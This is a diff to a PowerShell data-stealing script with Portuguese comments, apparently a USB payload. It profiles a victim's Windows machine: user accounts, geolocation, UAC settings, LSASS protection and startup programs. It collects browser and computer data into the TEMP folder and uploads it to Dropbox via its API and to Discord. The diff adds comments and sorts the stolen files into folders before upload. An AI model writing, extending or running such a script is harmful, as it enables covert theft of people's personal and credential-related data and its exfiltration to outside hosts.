@@ -156,7 +156,7 @@ $Lon = $GeoLocation[1].Substring(10) -replace ".$"
 $luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String 
 
 ############################################################################################################################################################
-
+# Identificação do UAC "User Account Control"
 Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }
 
 $Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
@@ -177,7 +177,7 @@ ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value
 Else{ $UAC = "Unknown" } 
 
 ############################################################################################################################################################
-
+# Confirma se o LSASS "Local Security Authority Subsystem Service" está ativado
 $lsass = Get-Process -Name "lsass"
 
 if ($lsass.ProtectedProcess) {$lsass = "LSASS is running as a protected process."} 
@@ -185,7 +185,7 @@ if ($lsass.ProtectedProcess) {$lsass = "LSASS is running as a protected process.
 else {$lsass = "LSASS is not running as a protected process."}
 
 ############################################################################################################################################################
-
+# Identifica quais os programas que existem no arranque
 $StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name
 
 ############################################################################################################################################################
@@ -549,7 +549,17 @@ Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Pos
 if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
 ############################################################################################################################################################
+#Organização de Ficheiros
+# Criar as pastas necessárias dentro da pasta temporária
+New-Item -Path "$env:TEMP\$FolderName\Dados do Browser" -ItemType Directory
+New-Item -Path "$env:TEMP\$FolderName\Dados do Computador" -ItemType Directory
+New-Item -Path "$env:TEMP\$FolderName\Tree" -ItemType Directory
 
+# Mover os arquivos para as pastas corretas
+Move-Item -Path "$env:TEMP\$FolderName\BrowserData.txt" -Destination "$env:TEMP\$FolderName\Dados do Browser"
+Move-Item -Path "$env:TEMP\$FolderName\computerData.txt" -Destination "$env:TEMP\$FolderName\Dados do Computador"
+Move-Item -Path "$env:TEMP\$FolderName\tree.txt" -Destination "$env:TEMP\$FolderName\Tree"
+############################################################################################################################################################
 #Upload para o Discord
 function Upload-Discord {
 
